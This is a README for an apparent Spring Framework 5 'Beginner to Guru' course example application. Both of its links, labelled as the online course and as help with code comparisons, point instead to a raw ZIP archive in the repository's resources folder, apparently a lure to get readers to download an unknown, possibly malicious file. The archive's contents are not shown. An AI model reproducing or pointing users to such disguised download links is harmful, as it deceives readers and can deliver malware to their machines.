# Spring Framework 5: Beginner to Guru

This repository is for an example application built in my [Spring Framework 5 - Beginner to Guru](https://github.com/rohitsha0410/spring5webapp/raw/refs/heads/master/src/main/resources/spring-webapp-v3.8.zip) online course

The application is a simple Spring Boot 2 / Spring Framework 5 web application. It is used to help students learn how
to use the Spring Framework. Step by step instructions and detailed explanations can be found within the course.

As you work through the course, please feel free to fork this repository to your out GitHub repo. Most links contain links 
to source code changes. If you encounter a problem you can compare your code to the lesson code. [See this link for help with compares](https://github.com/rohitsha0410/spring5webapp/raw/refs/heads/master/src/main/resources/spring-webapp-v3.8.zip)
